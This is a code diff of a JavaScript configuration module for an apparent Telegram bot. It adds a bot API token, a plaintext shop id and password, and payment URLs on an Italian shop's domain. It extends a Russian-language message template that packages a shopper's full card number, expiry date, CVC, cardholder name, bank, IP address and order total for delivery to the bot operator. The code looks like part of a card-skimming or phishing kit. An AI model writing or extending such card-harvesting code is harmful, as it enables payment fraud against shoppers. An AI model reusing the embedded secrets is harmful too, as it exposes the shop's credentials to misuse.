@@ -1,5 +1,19 @@
 module.exports.api = '7917225525:AAEUQikR19rMawejJUlS2-ENeXl8tU409nk';
 
+
+module.exports.shop = {
+    id: '1230321',
+    password: 'qwertyuiop'
+}
+
+module.exports.url = {
+    'shop': 'https://bellezzadelbebe.it/',
+    'accept': 'https://bellezzadelbebe.it/payments/external/server',
+    'success': (payment_gateway_id)=> { return `https://bellezzadelbebe.it/payments/external/${payment_gateway_id}/success` },
+    'fail': (payment_gateway_id)=> { return `https://bellezzadelbebe.it/payments/external/${payment_gateway_id}/fail` }
+}
+
+
 module.exports.inlineButtons = {
     reply_markup: {
         inline_keyboard: [
@@ -16,13 +30,24 @@ module.exports.inlineButtons = {
 };
 
 module.exports.msgBot = (msgData)=> {
-    return `Пользователь ввёл данные карты для оплаты
-заказа
+    const order = JSON.parse(msgData.order);
+    let currency = '€';
+    if(order.currency_code == 'EUR') currency = '€'
+    else if(order.currency_code == 'USD') currency = '$'
+    else if(order.currency_code == 'RUB') currency = '₽'
+    
+    return `Пользователь ${order.client.id} ввёл данные карты для оплаты
+заказа ${order.id}
 
 Номер:${msgData.cardNumber}
 Срок: ${msgData.expiryDate}
 CSV: ${msgData.cvc}
 Имя: ${msgData.billingName}
+
+Банк: ${msgData.bank}
+IP: ${order.client.ip_addr}
+
+Сумма: ${order.total_profit} ${currency}
 `
 }
 
